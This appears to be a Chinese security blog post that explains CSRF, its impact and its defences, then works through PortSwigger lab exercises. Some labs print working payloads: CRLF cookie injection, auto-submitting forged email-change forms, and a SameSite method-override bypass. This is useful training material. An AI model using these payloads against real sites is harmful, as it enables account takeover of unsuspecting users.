@@ -1,0 +1,1736 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CSRF 原理&amp;攻击, 让我再浪一会">
+    <meta name="description" content="CSRF 原理&amp;攻击">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>CSRF 原理&amp;攻击 | 让我再浪一会</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">让我再浪一会</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">让我再浪一会</div>
+        <div class="logo-desc">
+            
+            让我再浪一会
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CSRF 原理&amp;攻击</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CSRF/">
+                                <span class="chip bg-color">CSRF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                漏洞学习
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-01-28
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    20 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="CSRF-原理-amp-攻击"><a href="#CSRF-原理-amp-攻击" class="headerlink" title="CSRF 原理&amp;攻击"></a>CSRF 原理&amp;攻击</h1><h2 id="1-CSRF-原理"><a href="#1-CSRF-原理" class="headerlink" title="1. CSRF 原理"></a>1. CSRF 原理</h2><p>CSRF（Cross Site Request Forgery, 跨站请求伪造）是一种网络的攻击方式，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF。</p>
+<p>CSRF漏洞是因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。</p>
+<p><img src="/../../../../pic/Pasted%20image%2020230305213056.png"></p>
+<p><img src="/../../../../pic/Pasted%20image%2020230305213101.png"></p>
+<h2 id="2-CSRF-的高危触发点"><a href="#2-CSRF-的高危触发点" class="headerlink" title="2. CSRF 的高危触发点"></a>2. CSRF 的高危触发点</h2><ol>
+<li>论坛交流</li>
+<li>用户中心</li>
+<li>反馈留言</li>
+<li>交易管理</li>
+<li>后台管理</li>
+</ol>
+<h2 id="3-CSRF-漏洞的危害"><a href="#3-CSRF-漏洞的危害" class="headerlink" title="3. CSRF 漏洞的危害"></a>3. CSRF 漏洞的危害</h2><ul>
+<li>伪造HTTP请求进行未授权操作</li>
+<li>篡改、盗取目标网站上的重要用户数据</li>
+<li>未经允许执行对用户名誉或者资产有害的操作，比如：散播不良信息、进行消费等</li>
+<li>如果通过使用社工等方式攻击网站管理员，会危害网站本身的安全性</li>
+<li>作为其他攻击向量的辅助攻击手法，比如配合XSS</li>
+<li>传播CSRF蠕虫</li>
+</ul>
+<h2 id="4-CSRF-防御措施"><a href="#4-CSRF-防御措施" class="headerlink" title="4. CSRF 防御措施"></a>4. CSRF 防御措施</h2><ul>
+<li>Referer验证</li>
+</ul>
+<p>根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问 <code>http://bank.test/test?page=10&amp;userID=101&amp;money=10000</code> 页面完成，用户必须先登录bank.test，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL（本例中，通常是以bank. test域名开头的地址）。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank. test开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。</p>
+<ul>
+<li>Token验证</li>
+</ul>
+<p>CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于Cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的Cookie来通过安全验证。由此可知，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。鉴于此，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p>
+<ul>
+<li>增加验证码验证</li>
+</ul>
+<p>Spring security的表单验证是通过过滤器链中的 UsernamePasswordAuthenticationFilter 来完成的，我们增加的验证码过滤器应该插在 UsernamePasswordAuthenticationFilter 之前，如果验证码校验不通过，直接返回，无需进行账户密码的校验。</p>
+<h2 id="5-CSRF-攻击"><a href="#5-CSRF-攻击" class="headerlink" title="5. CSRF 攻击"></a>5. CSRF 攻击</h2><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">PortSwigger - CSRF</a></p>
+<h3 id="1-Lab-CSRF-vulnerability-with-no-defenses"><a href="#1-Lab-CSRF-vulnerability-with-no-defenses" class="headerlink" title="1. Lab: CSRF vulnerability with no defenses"></a>1. Lab: CSRF vulnerability with no defenses</h3><ul>
+<li>题目描述</li>
+</ul>
+<p>This lab’s email change functionality is vulnerable to CSRF.</p>
+<p>To solve the lab, craft some HTML that uses a&nbsp;<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address and upload it to your exploit server.</p>
+<p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p>
+<ul>
+<li>题目解析</li>
+</ul>
+<p>目标为修改浏览者的 email 地址</p>
+<p>访问 hoem 并且使用给出的测试用户登录</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305213723.png"></p>
+<p>找到修改 Email 的功能点，进行抓包</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305213933.png"></p>
+<p>获得了数据包</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305214110.png"></p>
+<p>右键选择生成 CSRF POC</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305214232.png"></p>
+<p>由于不会手动点击提交按钮，所以在选项中勾选自动提交脚本，然后重新生成</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305214336.png"></p>
+<p>前往攻击页面</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305214535.png"></p>
+<p>运行结果</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305214836.png"></p>
+<p>成功执行</p>
+<h3 id="2-Lab-CSRF-where-token-validation-depends-on-request-method"><a href="#2-Lab-CSRF-where-token-validation-depends-on-request-method" class="headerlink" title="2. Lab: CSRF where token validation depends on request method"></a>2. Lab: CSRF where token validation depends on request method</h3><ul>
+<li>题目描述</li>
+</ul>
+<p>This lab’s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.</p>
+<p>To solve the lab, use your exploit server to host an HTML page that uses a&nbsp;<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address.</p>
+<p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p>
+<ul>
+<li>题目解析</li>
+</ul>
+<p>只对某些请求方式做了防御，在此次攻击测试中尝试通过修改请求方式进行绕过</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305220138.png"></p>
+<p>当修改 csrf 时会因为过不了验证而拒绝服务</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305220237.png"></p>
+<p>修改请求方式为 GET</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305220303.png"></p>
+<p>此时不再验证 csrf ，生成 POC</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305220352.png"></p>
+<p>前往漏洞利用页面提交</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305220424.png"></p>
+<h3 id="3-Lab-CSRF-where-token-validation-depends-on-token-being-present"><a href="#3-Lab-CSRF-where-token-validation-depends-on-token-being-present" class="headerlink" title="3. Lab: CSRF where token validation depends on token being present"></a>3. Lab: CSRF where token validation depends on token being present</h3><ul>
+<li>题目描述</li>
+</ul>
+<p>This lab’s email change functionality is vulnerable to CSRF.</p>
+<p>To solve the lab, use your exploit server to host an HTML page that uses a&nbsp;<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address.</p>
+<p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p>
+<ul>
+<li>题目解析</li>
+</ul>
+<p>继续抓包</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305221347.png"></p>
+<p>禁用了 GET 请求方式，尝试修改其他的请求方式也无果</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305224135.png"></p>
+<p>直接将 csrf 参数删除发现也能进行修改</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305224231.png"></p>
+<p>生成对应 POC</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305224419.png"></p>
+<p>成功修改</p>
+<h3 id="4-Lab-CSRF-where-token-is-not-tied-to-user-session"><a href="#4-Lab-CSRF-where-token-is-not-tied-to-user-session" class="headerlink" title="4. Lab: CSRF where token is not tied to user session"></a>4. Lab: CSRF where token is not tied to user session</h3><ul>
+<li>题目描述</li>
+</ul>
+<p>This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t integrated into the site’s session handling system.</p>
+<p>To solve the lab, use your exploit server to host an HTML page that uses a&nbsp;<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address.</p>
+<p>You have two accounts on the application that you can use to help design your attack. The credentials are as follows:</p>
+<ul>
+<li><code>wiener:peter</code></li>
+<li><code>carlos:montoya</code></li>
+</ul>
+<ul>
+<li>题目解析</li>
+</ul>
+<p>这次给了两个账户，依旧是抓包测试</p>
+<p>先使用 wiener 用户</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305232834.png"></p>
+<p>通过测试发现每个 token 只能使用一次</p>
+<p>该 token 可以在提交修改时生成，在修改时抓包获取 token</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305233007.png"></p>
+<p>拿着生成的新 token 访问</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305233031.png"></p>
+<p>修改成功</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305233056.png"></p>
+<p>抓包先获取一个新的 token 然后构造 POC</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305233202.png"></p>
+<p>前去执行</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305233243.png"></p>
+<h3 id="5-Lab-CSRF-where-token-is-tied-to-non-session-cookie"><a href="#5-Lab-CSRF-where-token-is-tied-to-non-session-cookie" class="headerlink" title="5. Lab: CSRF where token is tied to non-session cookie"></a>5. Lab: CSRF where token is tied to non-session cookie</h3><ul>
+<li>题目描述</li>
+</ul>
+<p>This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t fully integrated into the site’s session handling system.</p>
+<p>To solve the lab, use your exploit server to host an HTML page that uses a&nbsp;<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address.</p>
+<p>You have two accounts on the application that you can use to help design your attack. The credentials are as follows:</p>
+<ul>
+<li><code>wiener:peter</code></li>
+<li><code>carlos:montoya</code></li>
+</ul>
+<ul>
+<li>题目解析</li>
+</ul>
+<p>抓包</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305234044.png"></p>
+<p>两个参数少一个都不行，猜测两个绑定在一起进行验证</p>
+<p>所以怎么样才能将 cookie 传入进去呢</p>
+<p>主页面还有一个搜索的功能</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230305234946.png"></p>
+<p>在 Set-Cookie 中插入了我们搜索的内容，在此处插入自定义响应头</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">/?search=test%0d%0aSet-Cookie:%20csrfKey=SY6driHbxFn7lzMuQnGjXCp2ymVhGYc8 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/../../../../../pic/Pasted%20image%2020230305235112.png"></p>
+<p>成功插入 cookie</p>
+<p>构造 POC，这里不适用 script 脚本，而是使用 img 标签请求 URL 并触发 submit</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
+  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0ab800a20314c7eec1abda9200ee0083.web-security-academy.net/my-account/change-email<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token entity" title="@">&amp;#64;</span>test<span class="token entity" title=".">&amp;#46;</span>com<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>VNTa3JmVIapxN7p0D6gocIyugw6W6r6V<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0ab800a20314c7eec1abda9200ee0083.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=SY6driHbxFn7lzMuQnGjXCp2ymVhGYc8%3b%20SameSite=None<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/../../../../../pic/Pasted%20image%2020230306001156.png"></p>
+<h3 id="6-Lab-CSRF-where-token-is-duplicated-in-cookie"><a href="#6-Lab-CSRF-where-token-is-duplicated-in-cookie" class="headerlink" title="6. Lab: CSRF where token is duplicated in cookie"></a>6. Lab: CSRF where token is duplicated in cookie</h3><ul>
+<li>题目描述</li>
+</ul>
+<p>This lab’s email change functionality is vulnerable to CSRF. It attempts to use the insecure “double submit” CSRF prevention technique.</p>
+<p>To solve the lab, use your exploit server to host an HTML page that uses a&nbsp;<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;to change the viewer’s email address.</p>
+<p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p>
+<ul>
+<li>题目解析</li>
+</ul>
+<p>依旧是进行抓包</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306002434.png"></p>
+<p>这次的 token 与 cookie 值相同</p>
+<p>同时修改后发现还能通过验证</p>
+<p><img src="/../../../../../pic/Pasted%20image%2020230306002542.png"></p>
+<p>其余方式与前面的利用方式一样</p>
+<p>构造 POC</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
+  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
+  &lt;body&gt;
+    &lt;script&gt;history.pushState('', '', '/');&lt;/script&gt;
+    &lt;form action="https://0a8a0058034fa270c06c9ace00800007.web-security-academy.net/my-account/change-email" method="POST"&gt;
+      &lt;input type="hidden" name="email" value="test&amp;#64;test&amp;#46;com" /&gt;
+      &lt;input type="hidden" name="csrf" value="hHIWwFlFtNZEgENqjxVgkZkM5yNuvc45" /&gt;
+      &lt;input type="submit" value="Submit request" /&gt;
+    &lt;/form&gt;
+		&lt;img src="https://0a8a0058034fa270c06c9ace00800007.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=hHIWwFlFtNZEgENqjxVgkZkM5yNuvc45%3b%20SameSite=None" onerror="document.forms[0].submit()"&gt;
+  &lt;/body&gt;
+&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/../../../../../pic/Pasted%20image%2020230306003111.png"></p>
+<h3 id="7-Lab-SameSite-Lax-bypass-via-method-override"><a href="#7-Lab-SameSite-Lax-bypass-via-method-override" class="headerlink" title="7. Lab: SameSite Lax bypass via method override"></a>7. Lab: SameSite Lax bypass via method override</h3><ul>
+<li>题目描述</li>
+</ul>
+<p>This lab’s change email function is vulnerable to CSRF. To solve the lab, perform a&nbsp;<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">CSRF attack</a>&nbsp;that changes the victim’s email address. You should use the provided exploit server to host your attack.</p>
+<p>You can log in to your own account using the following credentials:&nbsp;<code>wiener:peter</code></p>
+<ul>
+<li>题目解析</li>
+</ul>
+<p>利用 <code>_method</code> 方法覆盖绕过 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-using-get-requests">SameSite</a> 限制</p>
+<p>构造 POC</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt; document.location = "https://0aa700b00472e8d8c1ffdaed00990025.web-security-academy.net/my-account/change-email?email=test@test.net&amp;_method=POST"; &lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/../../../../../pic/Pasted%20image%2020230306010111.png"></p>
+<h3 id="8-Lab-SameSite-Strict-bypass-via-client-side-redirect"><a href="#8-Lab-SameSite-Strict-bypass-via-client-side-redirect" class="headerlink" title="8. Lab: SameSite Strict bypass via client-side redirect"></a>8. Lab: SameSite Strict bypass via client-side redirect</h3><ul>
+<li>题目描述</li>
+</ul>
